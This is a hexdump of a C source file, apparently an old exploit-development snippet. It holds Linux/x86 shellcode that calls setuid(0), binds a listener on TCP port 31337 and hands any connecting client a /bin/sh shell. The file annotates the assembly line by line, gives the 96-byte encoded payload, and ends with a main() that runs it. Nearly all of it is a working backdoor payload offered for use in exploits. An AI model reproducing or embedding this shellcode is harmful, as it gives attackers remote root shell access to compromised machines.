00000000  2f 2a 0d 0a 20 2a 20 24  49 64 3a 20 70 6f 72 74  |/*.. * $Id: port|
00000010  62 69 6e 64 2d 6c 69 6e  75 78 2e 63 2c 76 20 31  |bind-linux.c,v 1|
00000020  2e 34 20 32 30 30 34 2f  30 36 2f 30 32 20 31 32  |.4 2004/06/02 12|
00000030  3a 32 32 3a 33 30 20 72  61 70 74 6f 72 20 45 78  |:22:30 raptor Ex|
00000040  70 20 24 0d 0a 20 2a 0d  0a 20 2a 20 70 6f 72 74  |p $.. *.. * port|
00000050  62 69 6e 64 2d 6c 69 6e  75 78 2e 63 20 2d 20 73  |bind-linux.c - s|
00000060  65 74 75 69 64 2f 70 6f  72 74 62 69 6e 64 20 73  |etuid/portbind s|
00000070  68 65 6c 6c 63 6f 64 65  20 66 6f 72 20 4c 69 6e  |hellcode for Lin|
00000080  75 78 2f 78 38 36 0d 0a  20 2a 20 43 6f 70 79 72  |ux/x86.. * Copyr|
00000090  69 67 68 74 20 28 63 29  20 32 30 30 33 20 4d 61  |ight (c) 2003 Ma|
000000a0  72 63 6f 20 49 76 61 6c  64 69 20 3c 72 61 70 74  |rco Ivaldi <rapt|
000000b0  6f 72 40 30 78 64 65 61  64 62 65 65 66 2e 69 6e  |or@0xdeadbeef.in|
000000c0  66 6f 3e 0d 0a 20 2a 0d  0a 20 2a 20 53 69 6d 70  |fo>.. *.. * Simp|
000000d0  6c 65 20 70 6f 72 74 62  69 6e 64 20 73 68 65 6c  |le portbind shel|
000000e0  6c 63 6f 64 65 20 74 68  61 74 20 62 69 6e 64 28  |lcode that bind(|
000000f0  29 27 73 20 61 20 73 65  74 75 69 64 28 30 29 20  |)'s a setuid(0) |
00000100  73 68 65 6c 6c 20 6f 6e  0d 0a 20 2a 20 70 6f 72  |shell on.. * por|
00000110  74 20 33 31 33 33 37 2f  74 63 70 20 28 62 61 73  |t 31337/tcp (bas|
00000120  65 64 20 6f 6e 20 62 69  67 68 61 77 6b 27 73 20  |ed on bighawk's |
00000130  63 6f 64 65 29 2e 0d 0a  20 2a 0d 0a 20 2a 20 54  |code)... *.. * T|
00000140  65 73 74 65 64 20 6f 6e  20 4c 69 6e 75 78 2e 0d  |ested on Linux..|
00000150  0a 20 2a 2f 0d 0a 0d 0a  2f 2a 0d 0a 20 2a 20 73  |. */..../*.. * s|
00000160  65 74 75 69 64 28 30 29  0d 0a 20 2a 0d 0a 20 2a  |etuid(0).. *.. *|
00000170  20 38 30 34 39 33 38 30  3a 20 20 20 20 20 20 20  | 8049380:       |
00000180  33 31 20 63 30 20 20 20  20 20 20 20 20 20 20 20  |31 c0           |
00000190  20 20 20 20 20 20 20 20  78 6f 72 20 20 20 20 25  |        xor    %|
000001a0  65 61 78 2c 25 65 61 78  0d 0a 20 2a 20 38 30 34  |eax,%eax.. * 804|
000001b0  39 33 38 32 3a 20 20 20  20 20 20 20 33 31 20 64  |9382:       31 d|
000001c0  62 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b               |
000001d0  20 20 20 20 78 6f 72 20  20 20 20 25 65 62 78 2c  |    xor    %ebx,|
000001e0  25 65 62 78 0d 0a 20 2a  20 38 30 34 39 33 38 34  |%ebx.. * 8049384|
000001f0  3a 20 20 20 20 20 20 20  62 30 20 31 37 20 20 20  |:       b0 17   |
00000200  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000210  6d 6f 76 20 20 20 20 24  30 78 31 37 2c 25 61 6c  |mov    $0x17,%al|
00000220  0d 0a 20 2a 20 38 30 34  39 33 38 36 3a 20 20 20  |.. * 8049386:   |
00000230  20 20 20 20 63 64 20 38  30 20 20 20 20 20 20 20  |    cd 80       |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 69 6e 74 20  |            int |
00000250  20 20 20 24 30 78 38 30  0d 0a 20 2a 0d 0a 20 2a  |   $0x80.. *.. *|
00000260  20 73 6f 63 6b 65 74 28  41 46 5f 49 4e 45 54 2c  | socket(AF_INET,|
00000270  20 53 4f 43 4b 5f 53 54  52 45 41 4d 2c 20 30 29  | SOCK_STREAM, 0)|
00000280  0d 0a 20 2a 0d 0a 20 2a  20 38 30 34 39 33 38 38  |.. *.. * 8049388|
00000290  3a 20 20 20 20 20 20 20  33 31 20 64 62 20 20 20  |:       31 db   |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002b0  78 6f 72 20 20 20 20 25  65 62 78 2c 25 65 62 78  |xor    %ebx,%ebx|
000002c0  0d 0a 20 2a 20 38 30 34  39 33 38 61 3a 20 20 20  |.. * 804938a:   |
000002d0  20 20 20 20 66 37 20 65  33 20 20 20 20 20 20 20  |    f7 e3       |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 6d 75 6c 20  |            mul |
000002f0  20 20 20 25 65 62 78 0d  0a 20 2a 20 38 30 34 39  |   %ebx.. * 8049|
00000300  33 38 63 3a 20 20 20 20  20 20 20 62 30 20 36 36  |38c:       b0 66|
00000310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000320  20 20 20 6d 6f 76 20 20  20 20 24 30 78 36 36 2c  |   mov    $0x66,|
00000330  25 61 6c 0d 0a 20 2a 20  38 30 34 39 33 38 65 3a  |%al.. * 804938e:|
00000340  20 20 20 20 20 20 20 35  33 20 20 20 20 20 20 20  |       53       |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000360  75 73 68 20 20 20 25 65  62 78 0d 0a 20 2a 20 38  |ush   %ebx.. * 8|
00000370  30 34 39 33 38 66 3a 20  20 20 20 20 20 20 34 33  |04938f:       43|
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000390  20 20 20 20 20 20 69 6e  63 20 20 20 20 25 65 62  |      inc    %eb|
000003a0  78 0d 0a 20 2a 20 38 30  34 39 33 39 30 3a 20 20  |x.. * 8049390:  |
000003b0  20 20 20 20 20 35 33 20  20 20 20 20 20 20 20 20  |     53         |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
000003d0  68 20 20 20 25 65 62 78  0d 0a 20 2a 20 38 30 34  |h   %ebx.. * 804|
000003e0  39 33 39 31 3a 20 20 20  20 20 20 20 34 33 20 20  |9391:       43  |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000400  20 20 20 20 69 6e 63 20  20 20 20 25 65 62 78 0d  |    inc    %ebx.|
00000410  0a 20 2a 20 38 30 34 39  33 39 32 3a 20 20 20 20  |. * 8049392:    |
00000420  20 20 20 35 33 20 20 20  20 20 20 20 20 20 20 20  |   53           |
00000430  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000440  20 20 25 65 62 78 0d 0a  20 2a 20 38 30 34 39 33  |  %ebx.. * 80493|
00000450  39 33 3a 20 20 20 20 20  20 20 38 39 20 65 31 20  |93:       89 e1 |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000470  20 20 6d 6f 76 20 20 20  20 25 65 73 70 2c 25 65  |  mov    %esp,%e|
00000480  63 78 0d 0a 20 2a 20 38  30 34 39 33 39 35 3a 20  |cx.. * 8049395: |
00000490  20 20 20 20 20 20 34 62  20 20 20 20 20 20 20 20  |      4b        |
000004a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 64 65  |              de|
000004b0  63 20 20 20 20 25 65 62  78 0d 0a 20 2a 20 38 30  |c    %ebx.. * 80|
000004c0  34 39 33 39 36 3a 20 20  20 20 20 20 20 63 64 20  |49396:       cd |
000004d0  38 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |80              |
000004e0  20 20 20 20 20 69 6e 74  20 20 20 20 24 30 78 38  |     int    $0x8|
000004f0  30 0d 0a 20 2a 0d 0a 20  2a 20 62 69 6e 64 28 73  |0.. *.. * bind(s|
00000500  2c 20 73 65 72 76 65 72  2c 20 73 69 7a 65 6f 66  |, server, sizeof|
00000510  28 73 65 72 76 65 72 29  29 0d 0a 20 2a 0d 0a 20  |(server)).. *.. |
00000520  2a 20 38 30 34 39 33 39  38 3a 20 20 20 20 20 20  |* 8049398:      |
00000530  20 38 39 20 63 37 20 20  20 20 20 20 20 20 20 20  | 89 c7          |
00000540  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
00000550  25 65 61 78 2c 25 65 64  69 0d 0a 20 2a 20 38 30  |%eax,%edi.. * 80|
00000560  34 39 33 39 61 3a 20 20  20 20 20 20 20 35 32 20  |4939a:       52 |
00000570  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000580  20 20 20 20 20 70 75 73  68 20 20 20 25 65 64 78  |     push   %edx|
00000590  0d 0a 20 2a 20 38 30 34  39 33 39 62 3a 20 20 20  |.. * 804939b:   |
000005a0  20 20 20 20 36 36 20 36  38 20 37 61 20 36 39 20  |    66 68 7a 69 |
000005b0  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
000005c0  77 20 20 24 30 78 36 39  37 61 0d 0a 20 2a 20 38  |w  $0x697a.. * 8|
000005d0  30 34 39 33 39 66 3a 20  20 20 20 20 20 20 34 33  |04939f:       43|
000005e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005f0  20 20 20 20 20 20 69 6e  63 20 20 20 20 25 65 62  |      inc    %eb|
00000600  78 0d 0a 20 2a 20 38 30  34 39 33 61 30 3a 20 20  |x.. * 80493a0:  |
00000610  20 20 20 20 20 36 36 20  35 33 20 20 20 20 20 20  |     66 53      |
00000620  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000630  68 20 20 20 25 62 78 0d  0a 20 2a 20 38 30 34 39  |h   %bx.. * 8049|
00000640  33 61 32 3a 20 20 20 20  20 20 20 38 39 20 65 31  |3a2:       89 e1|
00000650  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000660  20 20 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |   mov    %esp,%|
00000670  65 63 78 0d 0a 20 2a 20  38 30 34 39 33 61 34 3a  |ecx.. * 80493a4:|
00000680  20 20 20 20 20 20 20 62  30 20 31 30 20 20 20 20  |       b0 10    |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
000006a0  6f 76 20 20 20 20 24 30  78 31 30 2c 25 61 6c 0d  |ov    $0x10,%al.|
000006b0  0a 20 2a 20 38 30 34 39  33 61 36 3a 20 20 20 20  |. * 80493a6:    |
000006c0  20 20 20 35 30 20 20 20  20 20 20 20 20 20 20 20  |   50           |
000006d0  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
000006e0  20 20 25 65 61 78 0d 0a  20 2a 20 38 30 34 39 33  |  %eax.. * 80493|
000006f0  61 37 3a 20 20 20 20 20  20 20 35 31 20 20 20 20  |a7:       51    |
00000700  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000710  20 20 70 75 73 68 20 20  20 25 65 63 78 0d 0a 20  |  push   %ecx.. |
00000720  2a 20 38 30 34 39 33 61  38 3a 20 20 20 20 20 20  |* 80493a8:      |
00000730  20 35 37 20 20 20 20 20  20 20 20 20 20 20 20 20  | 57             |
00000740  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
00000750  25 65 64 69 0d 0a 20 2a  20 38 30 34 39 33 61 39  |%edi.. * 80493a9|
00000760  3a 20 20 20 20 20 20 20  38 39 20 65 31 20 20 20  |:       89 e1   |
00000770  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000780  6d 6f 76 20 20 20 20 25  65 73 70 2c 25 65 63 78  |mov    %esp,%ecx|
00000790  0d 0a 20 2a 20 38 30 34  39 33 61 62 3a 20 20 20  |.. * 80493ab:   |
000007a0  20 20 20 20 62 30 20 36  36 20 20 20 20 20 20 20  |    b0 66       |
000007b0  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
000007c0  20 20 20 24 30 78 36 36  2c 25 61 6c 0d 0a 20 2a  |   $0x66,%al.. *|
000007d0  20 38 30 34 39 33 61 64  3a 20 20 20 20 20 20 20  | 80493ad:       |
000007e0  63 64 20 38 30 20 20 20  20 20 20 20 20 20 20 20  |cd 80           |
000007f0  20 20 20 20 20 20 20 20  69 6e 74 20 20 20 20 24  |        int    $|
00000800  30 78 38 30 0d 0a 20 2a  0d 0a 20 2a 20 6c 69 73  |0x80.. *.. * lis|
00000810  74 65 6e 28 73 2c 20 31  29 0d 0a 20 2a 0d 0a 20  |ten(s, 1).. *.. |
00000820  2a 20 38 30 34 39 33 61  66 3a 20 20 20 20 20 20  |* 80493af:      |
00000830  20 62 30 20 36 36 20 20  20 20 20 20 20 20 20 20  | b0 66          |
00000840  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
00000850  24 30 78 36 36 2c 25 61  6c 0d 0a 20 2a 20 38 30  |$0x66,%al.. * 80|
00000860  34 39 33 62 31 3a 20 20  20 20 20 20 20 62 33 20  |493b1:       b3 |
00000870  30 34 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |04              |
00000880  20 20 20 20 20 6d 6f 76  20 20 20 20 24 30 78 34  |     mov    $0x4|
00000890  2c 25 62 6c 0d 0a 20 2a  20 38 30 34 39 33 62 33  |,%bl.. * 80493b3|
000008a0  3a 20 20 20 20 20 20 20  63 64 20 38 30 20 20 20  |:       cd 80   |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008c0  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 20 2a  |int    $0x80.. *|
000008d0  0d 0a 20 2a 20 61 63 63  65 70 74 28 73 2c 20 30  |.. * accept(s, 0|
000008e0  2c 20 30 29 0d 0a 20 2a  0d 0a 20 2a 20 38 30 34  |, 0).. *.. * 804|
000008f0  39 33 62 35 3a 20 20 20  20 20 20 20 35 30 20 20  |93b5:       50  |
00000900  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000910  20 20 20 20 70 75 73 68  20 20 20 25 65 61 78 0d  |    push   %eax.|
00000920  0a 20 2a 20 38 30 34 39  33 62 36 3a 20 20 20 20  |. * 80493b6:    |
00000930  20 20 20 35 30 20 20 20  20 20 20 20 20 20 20 20  |   50           |
00000940  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000950  20 20 25 65 61 78 0d 0a  20 2a 20 38 30 34 39 33  |  %eax.. * 80493|
00000960  62 37 3a 20 20 20 20 20  20 20 35 37 20 20 20 20  |b7:       57    |
00000970  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000980  20 20 70 75 73 68 20 20  20 25 65 64 69 0d 0a 20  |  push   %edi.. |
00000990  2a 20 38 30 34 39 33 62  38 3a 20 20 20 20 20 20  |* 80493b8:      |
000009a0  20 38 39 20 65 31 20 20  20 20 20 20 20 20 20 20  | 89 e1          |
000009b0  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
000009c0  25 65 73 70 2c 25 65 63  78 0d 0a 20 2a 20 38 30  |%esp,%ecx.. * 80|
000009d0  34 39 33 62 61 3a 20 20  20 20 20 20 20 34 33 20  |493ba:       43 |
000009e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000009f0  20 20 20 20 20 69 6e 63  20 20 20 20 25 65 62 78  |     inc    %ebx|
00000a00  0d 0a 20 2a 20 38 30 34  39 33 62 62 3a 20 20 20  |.. * 80493bb:   |
00000a10  20 20 20 20 62 30 20 36  36 20 20 20 20 20 20 20  |    b0 66       |
00000a20  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00000a30  20 20 20 24 30 78 36 36  2c 25 61 6c 0d 0a 20 2a  |   $0x66,%al.. *|
00000a40  20 38 30 34 39 33 62 64  3a 20 20 20 20 20 20 20  | 80493bd:       |
00000a50  63 64 20 38 30 20 20 20  20 20 20 20 20 20 20 20  |cd 80           |
00000a60  20 20 20 20 20 20 20 20  69 6e 74 20 20 20 20 24  |        int    $|
00000a70  30 78 38 30 0d 0a 20 2a  0d 0a 20 2a 20 64 75 70  |0x80.. *.. * dup|
00000a80  32 28 63 2c 20 32 29 0d  0a 20 2a 20 64 75 70 32  |2(c, 2).. * dup2|
00000a90  28 63 2c 20 31 29 0d 0a  20 2a 20 64 75 70 32 28  |(c, 1).. * dup2(|
00000aa0  63 2c 20 30 29 0d 0a 20  2a 0d 0a 20 2a 20 38 30  |c, 0).. *.. * 80|
00000ab0  34 39 33 62 66 3a 20 20  20 20 20 20 20 38 39 20  |493bf:       89 |
00000ac0  64 39 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |d9              |
00000ad0  20 20 20 20 20 6d 6f 76  20 20 20 20 25 65 62 78  |     mov    %ebx|
00000ae0  2c 25 65 63 78 0d 0a 20  2a 20 38 30 34 39 33 63  |,%ecx.. * 80493c|
00000af0  31 3a 20 20 20 20 20 20  20 38 39 20 63 33 20 20  |1:       89 c3  |
00000b00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b10  20 6d 6f 76 20 20 20 20  25 65 61 78 2c 25 65 62  | mov    %eax,%eb|
00000b20  78 0d 0a 20 2a 20 38 30  34 39 33 63 33 3a 20 20  |x.. * 80493c3:  |
00000b30  20 20 20 20 20 62 30 20  33 66 20 20 20 20 20 20  |     b0 3f      |
00000b40  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000b50  20 20 20 20 24 30 78 33  66 2c 25 61 6c 0d 0a 20  |    $0x3f,%al.. |
00000b60  2a 20 38 30 34 39 33 63  35 3a 20 20 20 20 20 20  |* 80493c5:      |
00000b70  20 34 39 20 20 20 20 20  20 20 20 20 20 20 20 20  | 49             |
00000b80  20 20 20 20 20 20 20 20  20 64 65 63 20 20 20 20  |         dec    |
00000b90  25 65 63 78 0d 0a 20 2a  20 38 30 34 39 33 63 36  |%ecx.. * 80493c6|
00000ba0  3a 20 20 20 20 20 20 20  63 64 20 38 30 20 20 20  |:       cd 80   |
00000bb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000bc0  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 20 2a  |int    $0x80.. *|
00000bd0  20 38 30 34 39 33 63 38  3a 20 20 20 20 20 20 20  | 80493c8:       |
00000be0  34 31 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |41              |
00000bf0  20 20 20 20 20 20 20 20  69 6e 63 20 20 20 20 25  |        inc    %|
00000c00  65 63 78 0d 0a 20 2a 20  38 30 34 39 33 63 39 3a  |ecx.. * 80493c9:|
00000c10  20 20 20 20 20 20 20 65  32 20 66 38 20 20 20 20  |       e2 f8    |
00000c20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6c  |               l|
00000c30  6f 6f 70 20 20 20 38 30  34 39 33 63 33 20 3c 73  |oop   80493c3 <s|
00000c40  63 2b 30 78 34 33 3e 0d  0a 20 2a 0d 0a 20 2a 20  |c+0x43>.. *.. * |
00000c50  65 78 65 63 76 65 28 22  2f 62 69 6e 2f 73 68 22  |execve("/bin/sh"|
00000c60  2c 20 5b 22 2f 62 69 6e  2f 73 68 22 5d 2c 20 4e  |, ["/bin/sh"], N|
00000c70  55 4c 4c 29 0d 0a 20 2a  0d 0a 20 2a 20 38 30 34  |ULL).. *.. * 804|
00000c80  39 33 63 62 3a 20 20 20  20 20 20 20 35 31 20 20  |93cb:       51  |
00000c90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ca0  20 20 20 20 70 75 73 68  20 20 20 25 65 63 78 0d  |    push   %ecx.|
00000cb0  0a 20 2a 20 38 30 34 39  33 63 63 3a 20 20 20 20  |. * 80493cc:    |
00000cc0  20 20 20 36 38 20 36 65  20 32 66 20 37 33 20 36  |   68 6e 2f 73 6|
00000cd0  38 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |8          push |
00000ce0  20 20 24 30 78 36 38 37  33 32 66 36 65 0d 0a 20  |  $0x68732f6e.. |
00000cf0  2a 20 38 30 34 39 33 64  31 3a 20 20 20 20 20 20  |* 80493d1:      |
00000d00  20 36 38 20 32 66 20 32  66 20 36 32 20 36 39 20  | 68 2f 2f 62 69 |
00000d10  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
00000d20  24 30 78 36 39 36 32 32  66 32 66 0d 0a 20 2a 20  |$0x69622f2f.. * |
00000d30  38 30 34 39 33 64 36 3a  20 20 20 20 20 20 20 38  |80493d6:       8|
00000d40  39 20 65 33 20 20 20 20  20 20 20 20 20 20 20 20  |9 e3            |
00000d50  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 25 65  |       mov    %e|
00000d60  73 70 2c 25 65 62 78 0d  0a 20 2a 20 38 30 34 39  |sp,%ebx.. * 8049|
00000d70  33 64 38 3a 20 20 20 20  20 20 20 35 31 20 20 20  |3d8:       51   |
00000d80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d90  20 20 20 70 75 73 68 20  20 20 25 65 63 78 0d 0a  |   push   %ecx..|
00000da0  20 2a 20 38 30 34 39 33  64 39 3a 20 20 20 20 20  | * 80493d9:     |
00000db0  20 20 35 33 20 20 20 20  20 20 20 20 20 20 20 20  |  53            |
00000dc0  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000dd0  20 25 65 62 78 0d 0a 20  2a 20 38 30 34 39 33 64  | %ebx.. * 80493d|
00000de0  61 3a 20 20 20 20 20 20  20 38 39 20 65 31 20 20  |a:       89 e1  |
00000df0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e00  20 6d 6f 76 20 20 20 20  25 65 73 70 2c 25 65 63  | mov    %esp,%ec|
00000e10  78 0d 0a 20 2a 20 38 30  34 39 33 64 63 3a 20 20  |x.. * 80493dc:  |
00000e20  20 20 20 20 20 62 30 20  30 62 20 20 20 20 20 20  |     b0 0b      |
00000e30  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000e40  20 20 20 20 24 30 78 62  2c 25 61 6c 0d 0a 20 2a  |    $0xb,%al.. *|
00000e50  20 38 30 34 39 33 64 65  3a 20 20 20 20 20 20 20  | 80493de:       |
00000e60  63 64 20 38 30 20 20 20  20 20 20 20 20 20 20 20  |cd 80           |
00000e70  20 20 20 20 20 20 20 20  69 6e 74 20 20 20 20 24  |        int    $|
00000e80  30 78 38 30 0d 0a 20 2a  20 38 30 34 39 33 65 30  |0x80.. * 80493e0|
00000e90  3a 20 20 20 20 20 20 20  30 30 20 30 30 20 20 20  |:       00 00   |
00000ea0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000eb0  61 64 64 20 20 20 20 25  61 6c 2c 28 25 65 61 78  |add    %al,(%eax|
00000ec0  29 0d 0a 20 2a 2f 0d 0a  0d 0a 63 68 61 72 20 73  |).. */....char s|
00000ed0  63 5b 5d 20 3d 20 2f 2a  20 38 20 2b 20 38 38 20  |c[] = /* 8 + 88 |
00000ee0  3d 20 39 36 20 62 79 74  65 73 20 2a 2f 0d 0a 22  |= 96 bytes */.."|
00000ef0  5c 78 33 31 5c 78 63 30  5c 78 33 31 5c 78 64 62  |\x31\xc0\x31\xdb|
00000f00  5c 78 62 30 5c 78 31 37  5c 78 63 64 5c 78 38 30  |\xb0\x17\xcd\x80|
00000f10  22 0d 0a 22 5c 78 33 31  5c 78 64 62 5c 78 66 37  |".."\x31\xdb\xf7|
00000f20  5c 78 65 33 5c 78 62 30  5c 78 36 36 5c 78 35 33  |\xe3\xb0\x66\x53|
00000f30  5c 78 34 33 5c 78 35 33  5c 78 34 33 5c 78 35 33  |\x43\x53\x43\x53|
00000f40  5c 78 38 39 5c 78 65 31  5c 78 34 62 5c 78 63 64  |\x89\xe1\x4b\xcd|
00000f50  5c 78 38 30 22 0d 0a 22  5c 78 38 39 5c 78 63 37  |\x80".."\x89\xc7|
00000f60  5c 78 35 32 5c 78 36 36  5c 78 36 38 22 0d 0a 22  |\x52\x66\x68".."|
00000f70  5c 78 37 61 5c 78 36 39  22 20 2f 2f 20 70 6f 72  |\x7a\x69" // por|
00000f80  74 20 33 31 33 33 37 2f  74 63 70 2c 20 63 68 61  |t 31337/tcp, cha|
00000f90  6e 67 65 20 69 66 20 6e  65 65 64 65 64 0d 0a 22  |nge if needed.."|
00000fa0  5c 78 34 33 5c 78 36 36  5c 78 35 33 5c 78 38 39  |\x43\x66\x53\x89|
00000fb0  5c 78 65 31 5c 78 62 30  5c 78 31 30 5c 78 35 30  |\xe1\xb0\x10\x50|
00000fc0  5c 78 35 31 5c 78 35 37  5c 78 38 39 5c 78 65 31  |\x51\x57\x89\xe1|
00000fd0  5c 78 62 30 5c 78 36 36  5c 78 63 64 5c 78 38 30  |\xb0\x66\xcd\x80|
00000fe0  22 0d 0a 22 5c 78 62 30  5c 78 36 36 5c 78 62 33  |".."\xb0\x66\xb3|
00000ff0  5c 78 30 34 5c 78 63 64  5c 78 38 30 22 0d 0a 22  |\x04\xcd\x80".."|
00001000  5c 78 35 30 5c 78 35 30  5c 78 35 37 5c 78 38 39  |\x50\x50\x57\x89|
00001010  5c 78 65 31 5c 78 34 33  5c 78 62 30 5c 78 36 36  |\xe1\x43\xb0\x66|
00001020  5c 78 63 64 5c 78 38 30  22 0d 0a 22 5c 78 38 39  |\xcd\x80".."\x89|
00001030  5c 78 64 39 5c 78 38 39  5c 78 63 33 5c 78 62 30  |\xd9\x89\xc3\xb0|
00001040  5c 78 33 66 5c 78 34 39  5c 78 63 64 5c 78 38 30  |\x3f\x49\xcd\x80|
00001050  22 0d 0a 22 5c 78 34 31  5c 78 65 32 5c 78 66 38  |".."\x41\xe2\xf8|
00001060  5c 78 35 31 5c 78 36 38  6e 2f 73 68 5c 78 36 38  |\x51\x68n/sh\x68|
00001070  2f 2f 62 69 5c 78 38 39  5c 78 65 33 5c 78 35 31  |//bi\x89\xe3\x51|
00001080  5c 78 35 33 5c 78 38 39  5c 78 65 31 5c 78 62 30  |\x53\x89\xe1\xb0|
00001090  5c 78 30 62 5c 78 63 64  5c 78 38 30 22 3b 0d 0a  |\x0b\xcd\x80";..|
000010a0  0d 0a 6d 61 69 6e 28 29  0d 0a 7b 0d 0a 09 69 6e  |..main()..{...in|
000010b0  74 20 28 2a 66 29 28 29  20 3d 20 28 69 6e 74 20  |t (*f)() = (int |
000010c0  28 2a 29 28 29 29 73 63  3b 20 66 28 29 3b 0d 0a  |(*)())sc; f();..|
000010d0  7d                                                |}|
000010d1
